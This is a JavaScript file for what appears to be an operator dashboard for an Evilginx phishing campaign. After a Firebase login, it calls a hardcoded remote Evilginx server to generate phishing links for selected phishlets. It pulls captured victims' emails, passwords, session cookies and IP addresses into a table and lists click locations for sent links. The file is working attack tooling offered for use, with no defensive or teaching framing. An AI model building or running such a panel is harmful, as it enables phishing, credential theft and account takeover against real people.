console.log("✅ script.js loaded successfully");

// Set your Evilginx server (use your domain if available)
const EVILGINX_SERVER = "http://tecan.com.co:5000";  // UPDATE this with your actual Evilginx domain/IP

// Ensure Firebase is loaded before executing functions
document.addEventListener("DOMContentLoaded", function () {
  if (typeof firebase === "undefined") {
    console.error("❌ Firebase is NOT defined. Check firebase-config.js.");
    return;
  }
  checkAuthStatus();
  
  // (Optional) Attach event listener to login button if not already attached inline
  const loginBtn = document.getElementById("loginBtn");
  if (loginBtn) {
    loginBtn.addEventListener("click", login);
  }
});

// Check Authentication Status and Redirect Accordingly
function checkAuthStatus() {
  firebase.auth().onAuthStateChanged(function (user) {
    if (user) {
      console.log("✅ User logged in:", user.email);
      if (window.location.pathname.endsWith("index.html") || window.location.pathname === "/") {
        window.location.href = "dashboard.html";
      }
    } else {
      console.log("❌ User not logged in.");
      if (window.location.pathname.endsWith("dashboard.html")) {
        window.location.href = "index.html";
      }
    }
  });
}

// Login Function
function login() {
  const email = document.getElementById("email").value;
  const password = document.getElementById("password").value;

  if (!email || !password) {
    alert("Please enter email and password.");
    return;
  }

  firebase.auth().signInWithEmailAndPassword(email, password)
    .then(function (userCredential) {
      console.log("✅ Login successful:", userCredential.user.email);
      window.location.href = "dashboard.html";
    })
    .catch(function (error) {
      console.error("❌ Login failed:", error.message);
      document.getElementById("loginError").innerText = error.message;
    });
}

// Logout Function
function logout() {
  firebase.auth().signOut().then(function () {
    console.log("✅ User logged out.");
    window.location.href = "index.html";
  }).catch(function (error) {
    console.error("❌ Logout failed:", error.message);
  });
}

// Evilginx API Integration Functions

// Generate Evilginx Phishing Link for Selected Phishlet
function generateLink() {
  // Get selected phishlet from dropdown (if present)
  const phishletSelect = document.getElementById("phishletSelect");
  const phishlet = phishletSelect ? phishletSelect.value : "";
  
  // Append phishlet as query parameter if provided
  let url = `${EVILGINX_SERVER}/generate_link`;
  if (phishlet) {
    url += `?phishlet=${encodeURIComponent(phishlet)}`;
  }
  
  fetch(url)
    .then(response => response.json())
    .then(data => {
      if (data.link) {
        console.log("✅ Link generated:", data.link);
        document.getElementById("generatedLink").innerHTML = `Generated Link: <a href="${data.link}" target="_blank">${data.link}</a>`;
      } else {
        console.error("❌ Failed to generate link:", data);
        alert("Failed to generate link.");
      }
    })
    .catch(error => {
      console.error("❌ Error generating link:", error);
      alert("Error generating link. Check Evilginx server.");
    });
}

// Fetch Captured Sessions and populate table
function viewCapturedSessions() {
  fetch(`${EVILGINX_SERVER}/captured_sessions`)
    .then(response => response.json())
    .then(data => {
      let tableBody = document.getElementById("capturedSessions");
      tableBody.innerHTML = "";
      data.forEach(function(session) {
        let row = `<tr>
                      <td>${session.email}</td>
                      <td>${session.password}</td>
                      <td>${session.cookies}</td>
                      <td>${session.ip}</td>
                   </tr>`;
        tableBody.innerHTML += row;
      });
      console.log("✅ Captured sessions loaded successfully.");
    })
    .catch(error => {
      console.error("❌ Error fetching captured sessions:", error);
      alert("Error fetching captured sessions.");
    });
}

// Fetch Generated Links History and populate table
function viewGeneratedLinks() {
  fetch(`${EVILGINX_SERVER}/generated_links`)
    .then(response => response.json())
    .then(data => {
      let tableBody = document.getElementById("generatedLinks");
      tableBody.innerHTML = "";
      data.forEach(function(link) {
        let row = `<tr>
                      <td>${link.url}</td>
                      <td>${link.clicked_location}</td>
                      <td>${link.ip}</td>
                   </tr>`;
        tableBody.innerHTML += row;
      });
      console.log("✅ Generated links history loaded successfully.");
    })
    .catch(error => {
      console.error("❌ Error fetching generated links:", error);
      alert("Error fetching generated links history.");
    });
}
